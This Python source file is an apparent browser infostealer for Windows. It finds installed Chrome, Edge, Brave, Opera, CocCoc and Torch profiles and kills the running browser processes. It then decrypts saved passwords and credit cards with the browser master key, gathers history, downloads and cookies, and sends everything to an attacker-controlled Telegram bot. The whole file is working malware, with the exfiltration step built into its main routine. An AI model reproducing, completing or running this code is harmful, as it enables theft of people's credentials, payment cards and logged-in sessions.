import os
import psutil
import asyncio
from enum import Enum
from utils import get_master_key, user, appdata
from utils.login_data import get_login_data
from utils.web_history import get_web_history
from utils.web_download import get_downloads
from utils.credit_card import get_credit_cards
from utils.save_data import SaveData
from utils.get_cookie import get_cookies
import time
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
from datetime import datetime
from telegram import Bot
from telegram import InputFile
from asyncio import sleep
from telegram.error import TimedOut
import sqlite3
import requests
import websocket
import json
import subprocess
import shutil
import platform as platform_module
import uuid
import wmi
import re

# Configuration
token = "{TOKEN}"
chat_id = "{CHAT_ID}"
PROGRAM_FILES_X86 = os.getenv('programfiles(x86)')
PROGRAM_FILES = os.getenv('programfiles')
# -----------------------------------------------------------------------------------------------


class Browser(Enum):
    CHROME = 'chrome'
    EDGE = 'edge'
    COCCOC = 'coccoc'
    BRAVE = 'brave'
    OPERA = 'opera'
    TORCH = 'torch'


browsers = {
    Browser.EDGE: appdata + '\\Microsoft\\Edge\\User Data',
    Browser.CHROME: appdata + '\\Google\\Chrome\\User Data',
    Browser.COCCOC: appdata + '\\CocCoc\\Browser\\User Data',
    Browser.BRAVE: appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    Browser.OPERA: appdata + '\\Opera Software\\Opera Stable',
    Browser.TORCH: appdata + '\\Torch\\User Data'
}


def check_and_close_browser(browser_name):
    for process in psutil.process_iter(['pid', 'name', 'username']):
        if browser_name.lower() in process.info['name'].lower():
            try:
                os.kill(process.info['pid'], 9)
            except PermissionError:
                # print(f"You don't have permission to close {browser_name}.")
                pass
            except Exception as e:
                print(
                    f"Oops, something went wrong when trying to close {browser_name}. Details: {str(e)}")


def installed_browsers():
    results = []
    for browser, path in browsers.items():
        if os.path.exists(path):
            results.append((browser, path))
    return results


def find_profiles(data_path):
    profile = []
    profile.append('Default')
    try:
        objects = os.listdir(data_path)
        files_dir = [f for f in objects if os.path.isdir(
            os.path.join(data_path, f))]
        for folder in files_dir:
            text = folder.split()
            if (text[0] == 'Profile'):
                profile.append(folder)
        return profile
    except:
        pass


def get_bin_path(browser_name):
    bin_path = None
    if browser_name == 'chrome':
        if os.path.exists(rf"{PROGRAM_FILES}\Google\Chrome\Application\chrome.exe"):
            bin_path = rf"{PROGRAM_FILES}\Google\Chrome\Application\chrome.exe"
        elif os.path.exists(rf"{PROGRAM_FILES_X86}\Google\Chrome\Application\chrome.exe"):
            bin_path = rf"{PROGRAM_FILES_X86}\Google\Chrome\Application\chrome.exe"
        elif os.path.exists(rf"{appdata}\Google\Chrome\Application\chrome.exe"):
            bin_path = rf"{appdata}\Google\Chrome\Application\chrome.exe"
        elif os.path.exists(rf"{appdata}\Google\Chrome SxS\Application\chrome.exe"):
            bin_path = rf"{appdata}\Google\Chrome SxS\Application\chrome.exe"
        elif os.path.exists(rf"{appdata}\Google\Chrome Beta\Application\chrome.exe"):
            bin_path = rf"{appdata}\Google\Chrome Beta\Application\chrome.exe"
    if browser_name == 'edge':
        if os.path.exists(rf"{PROGRAM_FILES_X86}\Microsoft\Edge\Application\msedge.exe"):
            bin_path = rf"{PROGRAM_FILES_X86}\Microsoft\Edge\Application\msedge.exe"
        elif os.path.exists(rf"{PROGRAM_FILES}\Microsoft\Edge\Application\msedge.exe"):
            bin_path = rf"{PROGRAM_FILES}\Microsoft\Edge\Application\msedge.exe"
        elif os.path.exists(rf"{appdata}\Microsoft\Edge\Application\msedge.exe"):
            bin_path = rf"{appdata}\Microsoft\Edge\Application\msedge.exe"
    if browser_name == 'coccoc':
        if os.path.exists(rf"{PROGRAM_FILES}\CocCoc\Browser\Application\browser.exe"):
            bin_path = rf"{PROGRAM_FILES}\CocCoc\Browser\Application\browser.exe"
        elif os.path.exists(rf"{PROGRAM_FILES_X86}\CocCoc\Browser\Application\browser.exe"):
            bin_path = rf"{PROGRAM_FILES_X86}\CocCoc\Browser\Application\browser.exe"
        elif os.path.exists(rf"{appdata}\CocCoc\Browser\Application\browser.exe"):
            bin_path = rf"{appdata}\CocCoc\Browser\Application\browser.exe"
    if browser_name == 'brave':
        if os.path.exists(rf"{PROGRAM_FILES_X86}\BraveSoftware\Brave-Browser\Application\brave.exe"):
            bin_path = rf"{PROGRAM_FILES_X86}\BraveSoftware\Brave-Browser\Application\brave.exe"
        elif os.path.exists(rf"{PROGRAM_FILES}\BraveSoftware\Brave-Browser\Application\brave.exe"):
            bin_path = rf"{PROGRAM_FILES}\BraveSoftware\Brave-Browser\Application\brave.exe"
        elif os.path.exists(rf"{appdata}\BraveSoftware\Brave-Browser\Application\brave.exe"):
            bin_path = rf"{appdata}\BraveSoftware\Brave-Browser\Application\brave.exe"
    if browser_name == 'opera':
        if os.path.exists(rf"{PROGRAM_FILES_X86}\Opera Software\Opera Stable\launcher.exe"):
            bin_path = rf"{PROGRAM_FILES_X86}\Opera Software\Opera Stable\launcher.exe"
        elif os.path.exists(rf"{PROGRAM_FILES}\Opera Software\Opera Stable\launcher.exe"):
            bin_path = rf"{PROGRAM_FILES}\Opera Software\Opera Stable\launcher.exe"
        elif os.path.exists(rf"{appdata}\Programs\Opera GX Stable\launcher.exe"):
            bin_path = rf"{appdata}\Programs\Opera GX Stable\launcher.exe"
    if browser_name == 'torch':
        if os.path.exists(rf"{PROGRAM_FILES_X86}\Torch\Torch\Application\torch.exe"):
            bin_path = rf"{PROGRAM_FILES_X86}\Torch\Torch\Application\torch.exe"
        elif os.path.exists(rf"{PROGRAM_FILES}\Torch\Torch\Application\torch.exe"):
            bin_path = rf"{PROGRAM_FILES}\Torch\Torch\Application\torch.exe"
        elif os.path.exists(rf"{appdata}\Programs\Torch Browser\launcher.exe"):
            bin_path = rf"{appdata}\Programs\Torch Browser\launcher.exe"
    return bin_path


async def main():
    available_browsers = installed_browsers()
    save_data = SaveData(token, chat_id)
    for browser_name, browser_path in available_browsers:
        check_and_close_browser(browser_name.value)
        print(f"Browser: {browser_name.value}")
        bin_value = get_bin_path(browser_name.value)
        if bin_value is None:
            print(f"Browser binary not found for {browser_name.value}.")
            continue

        master_key = get_master_key(browser_path)
        profiles = find_profiles(browser_path)

        for profile in profiles:
            save_data.save_file(f'{browser_name.value}_{profile}', "Passwords", get_login_data(
                browser_path, profile, master_key))
            save_data.save_file(f'{browser_name.value}_{profile}',
                                "History", get_web_history(browser_path, profile))
            save_data.save_file(f'{browser_name.value}_{profile}',
                                "Downloads", get_downloads(browser_path, profile))
            save_data.save_file(f'{browser_name.value}_{profile}', "Credit Cards", get_credit_cards(
                browser_path, profile, master_key))
            save_data.save_file(f'{browser_name.value}_{profile}', "Cookies", get_cookies(
                browser_path, profile, bin_value, browser_name.value))
            time.sleep(4)

    await save_data.send_data_to_server()

if __name__ == '__main__':
    asyncio.run(main())
